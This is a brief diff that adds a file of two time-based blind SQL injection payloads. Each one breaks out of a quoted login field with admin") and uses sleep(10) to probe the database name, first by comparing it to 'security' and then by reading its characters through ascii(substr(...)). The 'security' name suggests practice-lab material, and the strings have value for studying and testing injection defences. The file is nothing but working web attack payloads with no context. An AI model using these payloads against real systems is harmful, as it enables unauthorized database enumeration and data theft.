@@ -1,0 +1,6 @@
+
+
+
+admin") AND if((select database() = "security"),sleep(10),NULL) #
+
+admin") and if((ascii(substr(database(),2,1)) < 200),sleep(10),NULL) #
